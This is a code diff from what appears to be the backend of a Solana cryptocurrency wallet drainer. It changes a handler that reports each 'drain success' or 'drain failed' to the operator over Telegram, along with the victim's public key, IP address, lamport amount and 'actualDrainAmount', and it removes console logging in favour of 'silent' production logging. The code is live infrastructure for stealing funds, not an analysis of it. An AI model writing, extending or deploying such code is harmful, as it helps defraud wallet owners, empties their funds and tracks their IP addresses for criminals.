@@ -88,20 +88,12 @@ async function handleConfirmationLogging(req, res) {
         const telegramLogger = (await import('../src/telegram.js')).default;
         await telegramLogger.logDrainSuccess({
           publicKey: publicKey,
-          txid: txid,
-          status: status,
-          ip: userIp,
-          lamports: req.body.lamports || 0
+          actualDrainAmount: req.body.actualDrainAmount || 0,
+          lamports: req.body.lamports || 0,
+          ip: userIp
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain success:', telegramError);
-        // Log drain success in production
-        console.log('[DRAIN_SUCCESS] Transaction successful:', {
-          publicKey: publicKey,
-          txid: txid,
-          status: status,
-          ip: userIp
-        });
       }
     } else if (error) {
               // Silent failed confirmation logging for production
@@ -109,20 +101,12 @@ async function handleConfirmationLogging(req, res) {
         const telegramLogger = (await import('../src/telegram.js')).default;
         await telegramLogger.logDrainFailed({
           publicKey: publicKey,
-          txid: txid,
-          error: error,
+          lamports: req.body.lamports || 0,
           ip: userIp,
-          lamports: req.body.lamports || 0
+          error: error || 'Transaction failed on-chain'
         });
       } catch (telegramError) {
         console.error('[TELEGRAM] Failed to log drain failed:', telegramError);
-        // Log drain failed in production
-        console.log('[DRAIN_FAILED] Transaction failed:', {
-          publicKey: publicKey,
-          txid: txid,
-          error: error,
-          ip: userIp
-        });
       }
     } else {
               // Silent unknown status logging for production
